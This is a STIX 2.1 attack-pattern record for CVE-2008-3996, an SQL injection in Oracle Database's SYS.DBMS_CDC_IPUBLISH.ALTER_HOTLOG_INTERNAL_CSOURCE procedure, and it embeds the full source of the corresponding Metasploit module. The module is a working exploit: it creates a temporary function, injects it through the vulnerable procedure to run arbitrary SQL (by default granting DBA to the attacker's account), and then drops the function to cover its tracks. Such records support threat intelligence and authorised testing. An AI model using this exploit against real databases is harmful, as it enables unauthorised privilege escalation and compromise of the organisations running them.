{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e27f4d8-4b51-457d-a929-bcdd11031962",
    "created": "2024-08-14T16:22:13.673671Z",
    "modified": "2024-08-14T16:22:13.673675Z",
    "name": "Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE",
    "description": " The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE procedure of the PL/SQL package DBMS_CDC_IPUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.  Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/oracle/dbms_cdc_ipublish.rb",
            "external_id": "dbms_cdc_ipublish.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3996"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE',\n      'Description'    => %q{\n          The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE\n          procedure of the PL/SQL package DBMS_CDC_IPUBLISH. Any user with execute privilege\n          on the vulnerable package can exploit this vulnerability. By default, users granted\n          EXECUTE_CATALOG_ROLE have the required privilege.  Affected versions: Oracle Database\n          Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-3996' ],\n          [ 'OSVDB', '49321']\n        ],\n      'DisclosureDate' => '2008-10-22'))\n\n      register_options(\n        [\n          OptString.new('SQL', [ false, 'SQL to execute.', \"GRANT DBA TO #{datastore['DBUSER']}\"]),\n        ])\n  end\n\n\n  def run\n    return if not check_dependencies\n\n    name = Rex::Text.rand_text_alpha_upper(rand(10) + 1)\n\n    function = \"\n      CREATE OR REPLACE FUNCTION #{name}\n      RETURN VARCHAR2 AUTHID CURRENT_USER\n      IS\n      PRAGMA AUTONOMOUS_TRANSACTION;\n      BEGIN\n      EXECUTE IMMEDIATE '#{datastore['SQL']}';\n      COMMIT;\n      RETURN NULL;\n      END;\"\n\n    package = \"\n      BEGIN\n      SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE('''||'||user||'.#{name}||''');END;\"\n\n    clean = \"DROP FUNCTION #{name}\"\n\n    begin\n      print_status(\"Sending function...\")\n      prepare_exec(function)\n    rescue => e\n      return\n    end\n\n    print_status(\"Attempting sql injection on SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE...\")\n    prepare_exec(package)\n\n    print_status(\"Done! Removing function '#{name}'...\")\n    prepare_exec(clean)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-22"
}